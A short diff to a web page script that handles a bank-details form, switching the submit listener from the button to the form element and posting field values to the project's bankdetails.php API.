@@ -1,5 +1,5 @@
 console.log("working")
-const addBankDetails = document.querySelector('#ajax button[type="submit"]'),
+const form = document.querySelector('#ajax'),
   inputFields = document.querySelectorAll('#ajax input:not([type="radio"] )'),
   inputFieldsArray = [...inputFields]
 
@@ -9,7 +9,7 @@ let data = {}
 const pageUrl = new URL(window.location.href);
 let id = pageUrl.searchParams.get('id')
 let internalReferenceId = pageUrl.searchParams.get('internal_reference_id')
-
+ 
 
 const sendRequest = (url) => {
   fetch(url, {
@@ -56,7 +56,7 @@ const submit = (url) => {
   }
 }
 
-addBankDetails && addBankDetails.addEventListener('submit', submit('https://www.bgvhwd.xyz/Project_files/API/bankdetails.php'))
+form && form.addEventListener('submit', submit('https://www.bgvhwd.xyz/Project_files/API/bankdetails.php'))
 
 console.log("working 2")
 
